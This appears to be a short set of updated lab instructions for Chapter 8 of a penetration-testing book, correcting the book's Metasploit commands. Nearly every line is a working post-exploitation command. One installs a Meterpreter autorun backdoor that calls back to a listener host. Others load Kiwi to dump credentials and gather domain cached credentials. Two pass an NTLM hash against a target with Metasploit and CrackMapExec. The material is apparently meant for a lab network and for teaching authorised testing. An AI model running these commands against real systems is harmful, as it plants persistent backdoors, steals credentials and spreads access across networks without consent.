# Chapter 8 Instructions

## Continue from Chapter 7

### Listing 8.1 Installing the Meterpreter autorun backdoor executable

Book says this

```
run persistence -A -L c:\\ -X -i 30 -p 8443 -r 10.0.10.160
```

Do this instead

```
run exploit/windows/local/persistence -A -L c:\\ -X -i 30 -p 8443 -r 10.0.10.211
```

### Listing 8.2 Reestablishing Meterpreter access automatically after system reboot

```
reboot
background
```

### Listing 8.3 Loading the Mimikatz Meterpreter extension

This won't work anymore

```
load mimikatz
help mimikatz
```

Use this instead

```
load kiwi
help kiwi
```

### Listing 8.4 Retrieving tspkg credentials with Kiwi

```
creds_all
```

### Listing 8.5 Harvesting domain cached credentials

```
run post/windows/gather/smart_cache
```

### Listing 8.9 Passing the hash with Metasploit

```
use auxiliary/scanner/smb/smb_login
set smbuser administrator
set smbpass aad3b435b51404eeaad3b435b51404ee:c1ea09ab1bab83a9c9c1f1c366576737
set smbdomain .
set rhosts 10.0.10.208
set threads 10
run
```

#### Listing 8.10 Using CrackMapExec to pass the hash

```
crackmapexec smb 10.0.10.208 --local-auth -u Administrator -H c1ea09ab1bab83a9c9c1f1c366576737
```
